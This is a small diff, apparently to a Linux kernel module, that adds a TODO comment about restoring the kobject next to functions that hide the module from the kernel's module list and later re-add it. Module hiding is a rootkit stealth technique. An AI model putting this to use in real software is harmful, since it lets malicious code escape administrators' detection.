@@ -28,6 +28,7 @@ int moduleHide_start(void) {
 	return 0;
 }
 
+// TODO: Add the kobject back too
 void moduleHide_stop(void) {
    if (!started) return;
 	list_add(&THIS_MODULE->list, prev);
